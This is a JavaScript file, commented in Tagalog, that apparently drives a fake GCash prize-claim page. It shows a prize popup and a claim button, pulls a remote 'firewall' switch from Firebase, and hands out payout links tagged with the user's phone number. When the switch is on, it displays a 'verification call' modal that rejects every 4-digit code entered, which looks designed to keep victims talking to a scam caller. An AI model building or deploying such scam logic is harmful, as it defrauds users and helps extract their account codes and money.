/**
 * popup_share.js
 * COMPLETE LOGIC: Firewall Check, Link Redirect, Verification Popup
 */

// ========== SIMPLE TEST - MAKIKITA SA SCREEN ==========
function testFirebaseConnection() {
    // Gumawa ng div para makita ang resulta
    var testDiv = document.createElement('div');
    testDiv.style.cssText = 'position:fixed; bottom:10px; left:10px; background:black; color:white; padding:10px; z-index:99999; font-size:12px; border-radius:5px;';
    testDiv.innerHTML = 'Testing Firebase...';
    document.body.appendChild(testDiv);
    
    if (typeof firebase === 'undefined') {
        testDiv.innerHTML = 'ERROR: Firebase not loaded!';
        testDiv.style.background = 'red';
        return;
    }
    
    testDiv.innerHTML = 'Firebase loaded. Checking links...';
    
    var db = firebase.database();
    db.ref('links').once('value').then(function(snap) {
        var data = snap.val();
        if (data) {
            var count = Object.keys(data).length;
            testDiv.innerHTML = 'SUCCESS: ' + count + ' links found in Firebase!';
            testDiv.style.background = 'green';
        } else {
            testDiv.innerHTML = 'WARNING: No links found in Firebase!';
            testDiv.style.background = 'orange';
        }
    }).catch(function(err) {
        testDiv.innerHTML = 'ERROR: ' + err.message;
        testDiv.style.background = 'red';
    });
}

// Auto-run ang test
setTimeout(testFirebaseConnection, 1000);

// ========== FIREBASE INITIALIZATION ==========
const db = firebase.database();

// ========== 1. MAIN ACTION: CLAIM THRU GCASH ==========
async function handleClaimThruGCash() {
    // Isara ang popup
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) prizePopup.style.display = 'none';
    
    if (!firebase || !firebase.database) {
        alert("Firebase not ready. Refresh page.");
        return;
    }
    
    var db = firebase.database();
    
    try {
        // Kunin ang firewall status
        var firewallSnap = await db.ref('admin/globalFirewall/active').once('value');
        var isFirewallOn = firewallSnap.val() === true;
        
        // Kunin ang available link (kung meron)
        var linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        var hasLink = linkSnap.exists();
        
        if (isFirewallOn) {
            // FIREWALL ON - palaging call verification
            showFirewallVerificationPopup();
            return;
        }
        
        // FIREWALL OFF
        if (hasLink) {
            // MAY LINK - Redirect
            var key = Object.keys(linkSnap.val())[0];
            var linkData = linkSnap.val()[key];
            var url = linkData.url;
            
            if (url && !url.startsWith('http')) {
                url = 'https://' + url;
            }
            
            await db.ref('links/' + key).update({
                status: 'claimed',
                claimedAt: Date.now(),
                user: localStorage.getItem("userPhone") || "Unknown"
            });
            
            window.location.href = url;
            
        } else {
            // WALANG LINK - Alert na may mga dahilan
            alert("WITHDRAWAL UNSUCCESSFUL\n\nPossible Reasons:\n• No GCash payout link available\n• Device reached maximum payout limit\n• No GCash app installed\n• Please try another device");
        }
        
    } catch(e) {
        alert("System error. Please try again.");
    }
}

// ========== 2. FIREWALL VERIFICATION POPUP ==========
function showFirewallVerificationPopup() {
    // Remove existing modal if any
    var existingModal = document.getElementById('firewallModal');
    if (existingModal) existingModal.remove();
    
    var modal = document.createElement('div');
    modal.id = 'firewallModal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20001';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
            <div style="color: white; font-size: 13px; margin-bottom: 20px;">
                <p>Please wait for the system-verification call.</p>
                <p>Enter the 4-digit code provided during the call.</p>
            </div>
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center;" placeholder="1234" maxlength="4">
                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
            </div>
            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; display: none;"></div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var codeInput = document.getElementById('verifyCodeInput');
    var verifyBtn = document.getElementById('submitVerifyBtn');
    var errorDiv = document.getElementById('verifyErrorMsg');
    
    if (codeInput) codeInput.focus();
    
    verifyBtn.onclick = function() {
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        
        errorDiv.innerHTML = "Invalid verification code. Please provide the correct 4-digit code from the verification call.";
        errorDiv.style.display = 'block';
        codeInput.value = '';
        codeInput.focus();
        
        console.log("Verification failed - Always invalid");
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== 3. NO LINK ALERT ==========
function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color: white; font-size: 13px; text-align: left; margin-top: 20px;">
                <p><strong>Possible Reasons:</strong></p>
                <p>• No GCash payout link available</p>
                <p>• Device reached maximum payout limit</p>
                <p>• No GCash app installed</p>
            </div>
            <button id="closeAlertBtn" style="background: #ff4444; border: none; border-radius: 40px; padding: 12px; color: white; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlertBtn').onclick = function() {
        modal.remove();
    };
}

// ========== 4. INITIALIZE CLAIM THRU GCASH BUTTON ==========
function initClaimThruGCashButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    
    if (claimBtn) {
        console.log("CLAIM THRU GCASH button found");
        
        // Remove existing listeners
        var newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        claimBtn = newBtn;
        
        // Add click event
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            console.log("CLAIM THRU GCASH button clicked");
            handleClaimThruGCash();
        };
        
        console.log("CLAIM THRU GCASH button ready");
    } else {
        console.log("CLAIM THRU GCASH button not found - will retry");
        setTimeout(initClaimThruGCashButton, 500);
    }
}

// ========== 5. PRIZE POPUP FUNCTIONS ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'flex';
        if (typeof startConfetti === 'function') startConfetti();
    }
}

function closePrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'none';
        if (typeof stopConfetti === 'function') stopConfetti();
    }
}

// ========== 6. INITIALIZE ON PAGE LOAD ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initClaimThruGCashButton();
});

// Expose functions for global access
window.handleClaimThruGCash = handleClaimThruGCash;
window.showPrizePopup = showPrizePopup;
window.closePrizePopup = closePrizePopup;
